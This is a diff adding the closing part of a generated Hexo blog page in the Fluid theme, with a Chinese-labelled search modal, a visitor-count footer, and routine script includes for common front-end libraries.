+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
